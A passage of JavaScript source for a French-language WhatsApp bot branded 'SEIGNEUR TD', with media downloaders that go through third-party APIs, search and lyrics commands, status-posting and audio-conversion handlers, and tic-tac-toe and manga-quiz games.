          caption: `✅ *TikTok*\n${r?.title ? '📝 ' + r.title + '\n' : ''}📏 ${(buf.length/1024/1024).toFixed(1)} MB\n\n*© SEIGNEUR TD*`
        }, { quoted: message });
        await editLoad('✅ TikTok envoyé !');
      }

    // ── GOOGLE DRIVE ──────────────────────────────────────────────────────────
    } else if (command === 'googledrv' || command === 'gdrive') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}googledrv <url Google Drive>`);
      const { data } = await axios.get(`${GIFTED}/gdrivedl`, { params: { apikey: 'gifted', url }, timeout: 60000 });
      const dlUrl = data?.result?.download_url || data?.download_url || data?.result?.url;
      const fname = data?.result?.name || data?.name || 'fichier';
      if (!dlUrl) throw new Error('Fichier introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 240000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        document: buf, fileName: fname, mimetype: 'application/octet-stream',
        caption: `✅ *${fname}*
📏 ${(buf.length/1024/1024).toFixed(1)} MB

*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ Google Drive envoyé !');

    // ── MEDIAFIRE ─────────────────────────────────────────────────────────────
    } else if (command === 'mediafire') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}mediafire <url MediaFire>`);
      const { data } = await axios.get(`${GIFTED}/mediafire`, { params: { apikey: 'gifted', url }, timeout: 60000 });
      const dlUrl = data?.result?.download_url || data?.download_url || data?.result?.url;
      const fname = data?.result?.filename || data?.filename || 'fichier';
      if (!dlUrl) throw new Error('Fichier introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 240000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        document: buf, fileName: fname, mimetype: 'application/octet-stream',
        caption: `✅ *${fname}*
📏 ${(buf.length/1024/1024).toFixed(1)} MB

*© SEIGNEUR TD*`
      }, { quoted: message });
      await editLoad('✅ MediaFire envoyé !');

    // ── INSTAGRAM ─────────────────────────────────────────────────────────────
    } else if (command === 'insta' || command === 'ig') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}ig <url Instagram>`);
      const { data } = await axios.get(`https://apis.xwolf.space/api/download/instagram/story`, { params: { url }, timeout: 60000 });
      const medias = data?.result || (data?.url ? [{ url: data.url }] : []);
      const mediaList = Array.isArray(medias) ? medias : [medias];
      if (!mediaList.length) throw new Error('Aucun média trouvé');
      for (const m of mediaList.slice(0, 5)) {
        const dlUrl = m?.url || m?.download_url || m?.video || m?.image;
        if (!dlUrl) continue;
        const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 120000 });
        const buf = Buffer.from(res.data);
        const isVid = String(dlUrl).includes('.mp4') || m?.type === 'video';
        if (isVid) await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: '🎥 *Instagram*\n\n*© SEIGNEUR TD*' }, { quoted: message });
        else await sock.sendMessage(remoteJid, { image: buf, caption: '🖼️ *Instagram*\n\n*© SEIGNEUR TD*' }, { quoted: message });
      }
      await editLoad('\u2705 Instagram envoy\u00e9 !');
    // ── SNAPCHAT ────────────────────────────────────────────────────────────────────────
    } else if (command === 'snap' || command === 'snapchat') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`❗ Usage: ${config.prefix}snap <url Snapchat>`);
      const { data } = await axios.get(`https://apis.xwolf.space/api/download/snapchat`, { params: { url }, timeout: 60000 });
      const medias = data?.result || (data?.url ? [{ url: data.url }] : []);
      const mediaList = Array.isArray(medias) ? medias : [medias];
      if (!mediaList.length) throw new Error('Aucun média Snapchat trouvé');
      for (const m of mediaList.slice(0, 5)) {
        const dlUrl = m?.url || m?.download_url || m?.video || m?.image;
        if (!dlUrl) continue;
        const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 120000 });
        const buf = Buffer.from(res.data);
        const isVid = String(dlUrl).includes('.mp4') || m?.type === 'video';
        if (isVid) await sock.sendMessage(remoteJid, { video: buf, mimetype: 'video/mp4', caption: '🎥 *Snapchat*\n\n*© SEIGNEUR TD*' }, { quoted: message });
        else await sock.sendMessage(remoteJid, { image: buf, caption: '🖼️ *Snapchat*\n\n*© SEIGNEUR TD*' }, { quoted: message });
      }
      await editLoad('✅ Snapchat envoyé !');

    // \u2500\u2500 GOOGLE SEARCH \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    } else if (command === 'google') {
      if (!query) return editLoad(`\u2757 Usage: ${config.prefix}google <recherche>`);
      const { data } = await axios.get(`https://api.giftedtech.co.ke/api/search/google`, { params: { apikey: 'gifted', query }, timeout: 30000 });
      const results = data?.result || data?.results || [];
      if (!results.length) throw new Error('Aucun r\u00e9sultat trouv\u00e9');
      let text = `\ud83d\udd0d *Google: ${query}*\n${'\u2501'.repeat(28)}\n\n`;
      results.slice(0, 5).forEach((r, i) => {
        const title = r?.title || r?.name || '';
        const snippet = r?.snippet || r?.description || r?.body || '';
        const link = r?.link || r?.url || '';
        text += `*${i + 1}.* ${title}\n`;
        if (snippet) text += `\ud83d\udcdd ${snippet}\n`;
        if (link) text += `\ud83d\udd17 ${link}\n`;
        text += '\n';
      });
      text += `*\u00a9 SEIGNEUR TD*`;
      await sock.sendMessage(remoteJid, { text }, { quoted: message });
      await editLoad('\u2705 R\u00e9sultats Google envoy\u00e9s !');

    // \u2500\u2500 PAROLES \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    } else if (command === 'parole' || command === 'lyrics') {
      if (!query) return editLoad(`\u2757 Usage: ${config.prefix}parole <titre - artiste>`);
      const { data } = await axios.get(`https://api.giftedtech.co.ke/api/search/lyrics`, { params: { apikey: 'gifted', query }, timeout: 30000 });
      const title   = data?.result?.title   || data?.title   || query;
      const artist  = data?.result?.artist  || data?.artist  || '';
      const lyrics  = data?.result?.lyrics  || data?.lyrics  || data?.result || '';
      if (!lyrics) throw new Error('Paroles introuvables');
      const lyricsText = typeof lyrics === 'string' ? lyrics : JSON.stringify(lyrics);
      const header = `\ud83c\udfb5 *${title}*${artist ? '\n\ud83c\udfa4 ' + artist : ''}\n${'\u2501'.repeat(28)}\n\n`;
      const full = header + lyricsText + `\n\n*\u00a9 SEIGNEUR TD*`;
      if (full.length > 4000) {
        const chunks = [];
        let remaining = lyricsText;
        while (remaining.length > 0) { chunks.push(remaining.slice(0, 3500)); remaining = remaining.slice(3500); }
        await sock.sendMessage(remoteJid, { text: header + chunks[0] }, { quoted: message });
        for (let i = 1; i < chunks.length; i++) {
          await sock.sendMessage(remoteJid, { text: chunks[i] + (i === chunks.length - 1 ? '\n\n*\u00a9 SEIGNEUR TD*' : '') });
        }
      } else {
        await sock.sendMessage(remoteJid, { text: full }, { quoted: message });
      }
      await editLoad('\u2705 Paroles envoy\u00e9es !');


    // -- SOUNDCLOUD / SONG --------------------------------------------------
    } else if (command === 'song' || command === 'soundcloud' || command === 'sc') {
      if (!url || !/^https?:\/\//i.test(url)) return editLoad(`! Usage: ${config.prefix}song <url SoundCloud>`);
      const { data } = await axios.get(`https://api.giftedtech.co.ke/api/download/soundclouddl`, { params: { apikey: 'gifted', url }, timeout: 60000 });
      const result = data?.result || data;
      const dlUrl = result?.download_url || result?.audio || result?.url || result?.link;
      const title = result?.title || result?.name || 'audio';
      const artist = result?.artist || result?.uploader || '';
      const duration = result?.duration || '';
      if (!dlUrl) throw new Error('Audio SoundCloud introuvable');
      const res = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 180000 });
      const buf = Buffer.from(res.data);
      await sock.sendMessage(remoteJid, {
        audio: buf, mimetype: 'audio/mpeg', fileName: `${title}.mp3`
      }, { quoted: message });
      await editLoad(`OK *${title}*${artist ? ' - ' + artist : ''}${duration ? ' (' + duration + ')' : ''} - ${(buf.length/1024/1024).toFixed(1)} MB - (c) SEIGNEUR TD`);

    } else {
      await editLoad(`❗ Commande inconnue: ${command}`);
    }

    try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}

  } catch(e) {
    console.error('[GIFTED DL]', e.message);
    await editLoad(`❌ Erreur: ${e.message}

*© SEIGNEUR TD*`);
    try { await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } }); } catch(ex) {}
  }
}

async function handleToStatus(sock, args, message, remoteJid, senderJid) {
  const BG_COLORS = [
    '#000000', '#1a1a2e', '#16213e', '#0f3460',
    '#533483', '#e94560', '#ff6b6b', '#ffd93d',
    '#6bcb77', '#4d96ff', '#845ec2', '#ff9671'
  ];
  const randomBg = () => BG_COLORS[Math.floor(Math.random() * BG_COLORS.length)];
  const randomFont = () => Math.floor(Math.random() * 8);

  // Construire la liste des JIDs pour le status broadcast
  function buildStatusJidList(sock) {
    const list = new Set();
    const contacts = sock._store?.contacts || {};
    for (const jid of Object.keys(contacts)) {
      if (jid.endsWith('@s.whatsapp.net')) list.add(jid);
    }
    if (sock?.user?.id) {
      const selfJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
      list.add(selfJid);
    }
    return [...list];
  }

  try {
    await sock.sendMessage(remoteJid, { react: { text: '📤', key: message.key } });

    const rawText =
      message.message?.conversation ||
      message.message?.extendedTextMessage?.text ||
      message.message?.imageMessage?.caption ||
      message.message?.videoMessage?.caption || '';

    const caption = rawText.trim().split(/\s+/).slice(1).join(' ').trim();
    const contextInfo = message.message?.extendedTextMessage?.contextInfo;
    const quoted = contextInfo?.quotedMessage;

    if (!caption && !quoted) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `*Usage:*\n◈ Réponds à une image/vidéo/audio avec *${config.prefix}tostatus*\n◈ *${config.prefix}tostatus <texte>* — poster un statut texte\n◈ Réponds + *${config.prefix}tostatus <légende>* — média avec légende`
      }, { quoted: message });
    }

    const statusJidList = buildStatusJidList(sock);
    const _send = sock._origSend || sock.sendMessage.bind(sock);

    if (quoted) {
      const quotedMsg = {
        key: {
          remoteJid: remoteJid,
          id: contextInfo.stanzaId,
          fromMe: false,
          participant: contextInfo.participant || undefined
        },
        message: quoted
      };

      const getBuffer = async (type) => {
        const stream = await downloadContentFromMessage(quoted[type + 'Message'], type);
        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        return Buffer.concat(chunks);
      };

      // Image
      if (quoted.imageMessage) {
        const buffer = await getBuffer('image');
        if (!buffer || buffer.length < 100) {
          await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
          return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement image !' });
        }
        await _send('status@broadcast', {
          image: buffer,
          caption: caption || quoted.imageMessage?.caption || '',
          mimetype: quoted.imageMessage?.mimetype || 'image/jpeg'
        }, { statusJidList });
        await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
        return await sock.sendMessage(remoteJid, { text: '✅ Image postée sur ton statut !' });
      }

      // Vidéo
      if (quoted.videoMessage) {
        const buffer = await getBuffer('video');
        if (!buffer || buffer.length < 100) {
          await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
          return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement vidéo !' });
        }
        await _send('status@broadcast', {
          video: buffer,
          caption: caption || quoted.videoMessage?.caption || '',
          mimetype: quoted.videoMessage?.mimetype || 'video/mp4',
          gifPlayback: false
        }, { statusJidList });
        await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
        return await sock.sendMessage(remoteJid, { text: '✅ Vidéo postée sur ton statut !' });
      }

      // Audio
      if (quoted.audioMessage) {
        const buffer = await getBuffer('audio');
        if (!buffer || buffer.length < 100) {
          await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
          return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement audio !' });
        }
        await _send('status@broadcast', {
          audio: buffer,
          mimetype: quoted.audioMessage?.mimetype || 'audio/mp4',
          ptt: false
        }, { statusJidList });
        await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
        return await sock.sendMessage(remoteJid, { text: '✅ Audio posté sur ton statut !' });
      }

      // Texte cité
      const quotedText = quoted.conversation || quoted.extendedTextMessage?.text || '';
      const textToPost = caption || quotedText;
      if (textToPost) {
        await _send('status@broadcast', {
          text: textToPost,
          backgroundColor: randomBg(),
          font: randomFont()
        }, { statusJidList });
        await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
        return await sock.sendMessage(remoteJid, { text: '✅ Statut texte posté !' });
      }

      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: '⚠️ Type de média non supporté. Réponds à une image, vidéo, audio ou texte.'
      });
    }

    // Texte simple sans citation
    await _send('status@broadcast', {
      text: caption,
      backgroundColor: randomBg(),
      font: randomFont()
    }, { statusJidList });
    await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
    return await sock.sendMessage(remoteJid, { text: '✅ Statut texte posté !' });

  } catch(e) {
    console.error('tostatus:', e);
    await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
  }
}

// .tosgroup — Poster un statut de groupe (groupStatusMessage)
// ── toaudio — Convertit un média cité en audio mp3 ──────────────────────────
async function handleToAudio(sock, args, message, remoteJid, senderJid) {
  try {
    await sock.sendMessage(remoteJid, { react: { text: '🎵', key: message.key } });

    const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `❌ Réponds à un audio, une vidéo ou un vocal avec *${config.prefix}toaudio*`
      }, { quoted: message });
    }

    let buffer = null;
    let srcType = null;

    if (quoted.audioMessage) {
      srcType = 'audio';
      const stream = await downloadContentFromMessage(quoted.audioMessage, 'audio');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      buffer = Buffer.concat(chunks);
    } else if (quoted.videoMessage) {
      srcType = 'video';
      const stream = await downloadContentFromMessage(quoted.videoMessage, 'video');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      buffer = Buffer.concat(chunks);
    } else {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `❌ Type de média non supporté. Réponds à un audio ou une vidéo.`
      }, { quoted: message });
    }

    if (!buffer || buffer.length < 100) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement du média.' });
    }

    await sock.sendMessage(remoteJid, {
      audio: buffer,
      mimetype: 'audio/mp4',
      ptt: false
    }, { quoted: message });

    await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
  } catch(e) {
    console.error('[TOAUDIO]', e);
    await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
  }
}

// ── toptt — Convertit un média cité en vocal (push-to-talk) ──────────────────
async function handleToPtt(sock, args, message, remoteJid, senderJid) {
  try {
    await sock.sendMessage(remoteJid, { react: { text: '🎤', key: message.key } });

    const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `❌ Réponds à un audio, une vidéo ou un vocal avec *${config.prefix}toptt*`
      }, { quoted: message });
    }

    let buffer = null;

    if (quoted.audioMessage) {
      const stream = await downloadContentFromMessage(quoted.audioMessage, 'audio');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      buffer = Buffer.concat(chunks);
    } else if (quoted.videoMessage) {
      const stream = await downloadContentFromMessage(quoted.videoMessage, 'video');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      buffer = Buffer.concat(chunks);
    } else {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, {
        text: `❌ Type de média non supporté. Réponds à un audio ou une vidéo.`
      }, { quoted: message });
    }

    if (!buffer || buffer.length < 100) {
      await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
      return await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement du média.' });
    }

    await sock.sendMessage(remoteJid, {
      audio: buffer,
      mimetype: 'audio/ogg; codecs=opus',
      ptt: true
    }, { quoted: message });

    await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } });
  } catch(e) {
    console.error('[TOPTT]', e);
    await sock.sendMessage(remoteJid, { react: { text: '❌', key: message.key } });
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
  }
}

async function handleToSGroup(sock, args, message, remoteJid, senderJid, isGroup) {
  try {
    if (!isGroup) {
      await sock.sendMessage(remoteJid, { text: `❌ Cette commande fonctionne uniquement dans un groupe.\n\n*© SEIGNEUR TD*` });
      return;
    }
    const quotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const text = args.join(' ');
    const _send = sock._origSend || sock.sendMessage.bind(sock);

    // Statut image
    if (quotedMsg?.imageMessage) {
      const imgData = quotedMsg.imageMessage;
      const stream = await downloadContentFromMessage(imgData, 'image');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);
      if (!buffer || buffer.length < 100) {
        await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement image !' }); return;
      }
      const caption = text || imgData.caption || '';
      await sock.sendMessage(remoteJid, {
        groupStatusMessage: {
          image: buffer,
          caption: caption,
          mimetype: imgData.mimetype || 'image/jpeg'
        }
      });
      await sock.sendMessage(remoteJid, { text: `🖼️ IMAGE POSTÉE AVEC SUCCÈS 😎\n\n*© SEIGNEUR TD*` });
      return;
    }

    // Statut vidéo
    if (quotedMsg?.videoMessage) {
      const vidData = quotedMsg.videoMessage;
      const stream = await downloadContentFromMessage(vidData, 'video');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);
      if (!buffer || buffer.length < 100) {
        await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement vidéo !' }); return;
      }
      await sock.sendMessage(remoteJid, {
        groupStatusMessage: {
          video: buffer,
          caption: text || '',
          mimetype: vidData.mimetype || 'video/mp4'
        }
      });
      await sock.sendMessage(remoteJid, { text: `🎥 VIDÉO POSTÉE AVEC SUCCÈS 😎\n\n*© SEIGNEUR TD*` });
      return;
    }

    // Statut audio
    if (quotedMsg?.audioMessage) {
      const audData = quotedMsg.audioMessage;
      const stream = await downloadContentFromMessage(audData, 'audio');
      const chunks = [];
      for await (const chunk of stream) chunks.push(chunk);
      const buffer = Buffer.concat(chunks);
      if (!buffer || buffer.length < 100) {
        await sock.sendMessage(remoteJid, { text: '❌ Échec téléchargement audio !' }); return;
      }
      await _send(remoteJid, {
        groupStatusMessage: {
          audio: buffer,
          mimetype: 'audio/mp4',
          ptt: true
        }
      });
      await sock.sendMessage(remoteJid, { text: `🎵 AUDIO POSTÉ AVEC SUCCÈS 😎\n\n*© SEIGNEUR TD*` });
      return;
    }

    // Statut texte
    if (text) {
      const colors = ['#FF5733','#33FF57','#3357FF','#FF33A8','#FFD700','#00CED1'];
      const bgColor = colors[Math.floor(Math.random() * colors.length)];
      await _send(remoteJid, {
        groupStatusMessage: {
          text: text,
          backgroundColor: bgColor,
          font: Math.floor(Math.random() * 5)
        }
      });
      await sock.sendMessage(remoteJid, { text: `✍️ TEXTE POSTÉ AVEC SUCCÈS 😎\n\n*© SEIGNEUR TD*` });
      return;
    }

    await sock.sendMessage(remoteJid, {
      text: `📢 *ToSGroup — Statut de groupe*\n\nUsage:\n• ${config.prefix}tosgroup [texte]\n• Réponds à une image + ${config.prefix}tosgroup\n• Réponds à une vidéo + ${config.prefix}tosgroup\n• Réponds à un audio + ${config.prefix}tosgroup\n\n*© SEIGNEUR TD*`
    });
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}\n\n*© SEIGNEUR TD*` });
  }
}
// =============================================
// 🎮 SYSTÈME DE JEUX
// =============================================

// ─── État global des jeux ─────────────────────────────────────────────────
const gameState = new Map(); // remoteJid → { type, data }

// ─── Dispatcher réactions jeux ────────────────────────────────────────────
async function handleGameReaction(sock, message, messageText, remoteJid, senderJid) {
  const state = gameState.get(remoteJid);
  if (!state) return;

  if (state.type === 'tictactoe') {
    await processTTTMove(sock, message, messageText, remoteJid, senderJid, state);
  } else if (state.type === 'quiz') {
    await processQuizAnswer(sock, message, messageText, remoteJid, senderJid, state);
  } else if (state.type === 'squidgame') {
    await processSquidReaction(sock, message, messageText, remoteJid, senderJid, state);
  }
}

// =============================================
// ❌⭕ TIC-TAC-TOE
// =============================================
const TTT_EMPTY = '⬜';
const TTT_X     = '❌';
const TTT_O     = '⭕';

function renderTTTBoard(board) {
  return board.reduce((str, cell, i) => str + cell + (i % 3 === 2 ? '\n' : ''), '');
}

function checkTTTWin(board, mark) {
  const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  return wins.some(([a,b,c]) => board[a]===mark && board[b]===mark && board[c]===mark);
}

async function handleTicTacToe(sock, args, message, remoteJid, senderJid, isGroup) {
  const existing = gameState.get(remoteJid);

  // Si partie en cours
  if (existing?.type === 'tictactoe') {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ A TicTacToe game is already in progress!\n\n${renderTTTBoard(existing.data.board)}\nType a number *1-9* to play.\n\n_${config.prefix}ttt stop → abandon_`
    });
    return;
  }

  // Stop la partie
  if (args[0] === 'stop') {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, { text: '🛑 TicTacToe game abandoned.' });
    return;
  }

  // Démarrer
  const player1 = senderJid;
  const player2 = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

  if (!player2) {
    await sock.sendMessage(remoteJid, {
      text: `❌⭕ *TIC-TAC-TOE*\n\nUsage: ${config.prefix}tictactoe @adversaire\n\nMention a player to start!\n\nDuring the game, type a number:\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣`,
      mentions: []
    });
    return;
  }

  const board = Array(9).fill(TTT_EMPTY);
  gameState.set(remoteJid, {
    type: 'tictactoe',
    data: {
      board,
      players: [player1, player2],
      marks:   [TTT_X, TTT_O],
      turn: 0,
      startTime: Date.now()
    }
  });

  await sock.sendMessage(remoteJid, {
    text: `❌⭕ *TIC-TAC-TOE COMMENCE!*\n\n` +
      `👤 Joueur 1: @${player1.split('@')[0]} → ❌\n` +
      `👤 Joueur 2: @${player2.split('@')[0]} → ⭕\n\n` +
      `${renderTTTBoard(board)}\n` +
      `*Position:*\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣\n\n` +
      `@${player1.split('@')[0]} → Your turn! Send a number 1-9`,
    mentions: [player1, player2]
  });
}

async function processTTTMove(sock, message, text, remoteJid, senderJid, state) {
  const { board, players, marks, turn } = state.data;
  const currentPlayer = players[turn];
  const currentMark   = marks[turn];

  if (senderJid !== currentPlayer) return; // Pas ton tour

  const pos = parseInt(text.trim()) - 1;
  if (isNaN(pos) || pos < 0 || pos > 8) return;
  if (board[pos] !== TTT_EMPTY) {
    await sock.sendMessage(remoteJid, { text: '⚠️ That cell is already taken!' });
    return;
  }

  board[pos] = currentMark;

  if (checkTTTWin(board, currentMark)) {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, {
      text: `${renderTTTBoard(board)}\n\n🏆 *@${currentPlayer.split('@')[0]} GAGNE!* ${currentMark}\n\nFélicitations! 🎉`,
      mentions: [currentPlayer]
    });
    return;
  }

  if (board.every(c => c !== TTT_EMPTY)) {
    gameState.delete(remoteJid);
    await sock.sendMessage(remoteJid, {
      text: `${renderTTTBoard(board)}\n\n🤝 *DRAW!*\nGood game to both of you!`
    });
    return;
  }

  const nextTurn = turn === 0 ? 1 : 0;
  state.data.turn = nextTurn;
  const nextPlayer = players[nextTurn];

  await sock.sendMessage(remoteJid, {
    text: `${renderTTTBoard(board)}\n\n@${nextPlayer.split('@')[0]} → Your turn! Send a number 1-9`,
    mentions: [nextPlayer]
  });
}

// =============================================
// 🍥 QUIZ MANGA
// =============================================
const QUIZ_MANGA = [
  { q: '🍥 Dans quel anime le personnage Naruto Uzumaki est-il le héros principal?', a: 'naruto', hint: 'C\'est le titre de l\'anime!' },
  { q: '⚔️ Quel est le pouvoir signature de Goku dans Dragon Ball?', a: 'kamehameha', hint: 'K-A-M-E...' },
  { q: '👁️ Comment s\'appelle le pouvoir oculaire de Sasuke?', a: 'sharingan', hint: 'Commence par S' },
  { q: '💀 Dans One Piece, comment s\'appelle le chapeau de paille emblématique de Luffy?', a: 'chapeau de paille', hint: 'C\'est son surnom!' },
  { q: '🗡️ Dans Demon Slayer, quel est le style de respiration principal de Tanjiro?', a: 'eau', hint: 'Un élément liquide' },
  { q: '⚡ Dans Attack on Titan, comment s\'appelle le titan colossal de Bertholdt?', a: 'titan colossal', hint: 'Il est très grand' },
  { q: '🏴‍☠️ Quel est le vrai nom de Zoro dans One Piece?', a: 'roronoa zoro', hint: 'Son nom de famille commence par R' },
  { q: '🔮 Dans Hunter x Hunter, comment s\'appelle l\'énergie vitale que les personnages utilisent?', a: 'nen', hint: '3 lettres' },
  { q: '🌊 Dans My Hero Academia, quel est le Quirk de Midoriya?', a: 'one for all', hint: 'Héritage de All Might' },
  { q: '🌙 Dans Bleach, comment s\'appelle l\'épée spirituelle d\'Ichigo?', a: 'zangetsu', hint: 'Tranche la lune' },
  { q: '🔥 Quel anime suit Tanjiro Kamado chassant des démons pour sauver sa sœur?', a: 'demon slayer', hint: 'Kimetsu no Yaiba' },
  { q: '💥 Dans One Punch Man, pourquoi Saitama est-il devenu chauve?', a: 'entrainement', hint: 'Il a trop...' },
  { q: '🃏 Dans Death Note, quel est le nom du carnet magique?', a: 'death note', hint: 'Le titre de l\'anime!' },
  { q: '🐉 Dans Fairy Tail, quel est le pouvoir de Natsu Dragneel?', a: 'flamme', hint: 'Très chaud!' },
  { q: '⚙️ Dans Fullmetal Alchemist, quels sont les frères Elric?', a: 'edward et alphonse', hint: 'Ed et Al' },
];

async function handleQuizManga(sock, args, message, remoteJid, senderJid, isGroup) {
  const existing = gameState.get(remoteJid);

  // Stop
  if (args[0] === 'stop') {
    if (existing?.type === 'quiz') {
      gameState.delete(remoteJid);
      await sock.sendMessage(remoteJid, { text: '🛑 Quiz arrêté!\n\n📊 *Score final:*\n' + formatQuizScores(existing.data.scores) });
    } else {
      await sock.sendMessage(remoteJid, { text: '❌ No quiz in progress.' });
    }
    return;
  }

  // Partie déjà en cours
  if (existing?.type === 'quiz') {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ A quiz is already in progress!\n\n❓ ${existing.data.current.q}\n\n_${config.prefix}quiz stop → stop_`
    });
    return;
  }

  // Nombre de questions
  const total = Math.min(parseInt(args[0]) || 10, 15);
  const questions = [...QUIZ_MANGA].sort(() => Math.random() - 0.5).slice(0, total);

  gameState.set(remoteJid, {
    type: 'quiz',
    data: {
      questions,
      index: 0,
      current: questions[0],
      scores: {},
      total,
      startTime: Date.now(),
      hintUsed: false
    }
  });

  await sock.sendMessage(remoteJid, {
    text: `🍥 *QUIZ MANGA COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📚 *${total} questions* sur les mangas!\nAnswer in chat — first to answer correctly wins the point!\n\n_${config.prefix}quiz stop → stop_\n\n━━━━━━━━━━━━━━━━━━━━━━━\n\n❓ *Question 1/${total}:*\n${questions[0].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint (-1 pt)_`
  });

  // Timer 30s par question
  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up! No one found it.'), 30000);
}

function formatQuizScores(scores) {
  if (Object.keys(scores).length === 0) return '_No points scored_';
  return Object.entries(scores)
    .sort(([,a],[,b]) => b - a)
    .map(([jid, pts], i) => `${i===0?'🥇':i===1?'🥈':'🥉'} @${jid.split('@')[0]}: ${pts} pt(s)`)
    .join('\n');
}

async function advanceQuizQuestion(sock, remoteJid, prefix = '') {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'quiz') return;

  const { questions, index, total, scores } = state.data;
  const nextIndex = index + 1;

  if (nextIndex >= total) {
    // Fin du quiz
    gameState.delete(remoteJid);
    const winner = Object.entries(scores).sort(([,a],[,b]) => b-a)[0];
    await sock.sendMessage(remoteJid, {
